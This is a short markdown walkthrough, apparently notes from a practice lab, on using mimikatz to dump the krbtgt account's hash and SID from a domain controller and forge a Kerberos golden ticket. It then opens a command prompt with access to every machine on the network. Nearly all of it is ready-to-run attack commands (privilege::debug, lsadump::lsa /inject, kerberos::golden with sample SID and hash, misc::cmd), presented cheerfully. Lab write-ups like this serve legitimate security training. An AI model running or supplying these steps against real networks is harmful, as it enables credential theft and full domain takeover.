### Install mimikatz on target machine upon access
(mimikatz will only be used on target machine)

Run mimikatz with .\mimikatz.exe
```
`privilege::debug` ensure this outputs [privilege "20" ok]
```
`lsadump::lsa /inject /name:krbtgt` This dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket. You can change the name to Administrator, sqlservice or other accounts you have access to.

Then fill in information into this command, like this
```
kerberos::golden /user:krbtgt /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:502
```

## Use the Golden Ticket to access other machine -
1.) `misc::cmd` - This will open a new command prompt with elevated privileges to all machines

2.) Access other Machines! - You will now have another command prompt with access to all other machines on the network! :)))) yay!

cheers ;)

![unnamed_9aa7e0aa6815454d957873613de51fcd](unnamed_9aa7e0aa6815454d957873613de51fcd.png)
![unnamed_818450ea194f499ca68e8ff7473e6f17](unnamed_818450ea194f499ca68e8ff7473e6f17.png)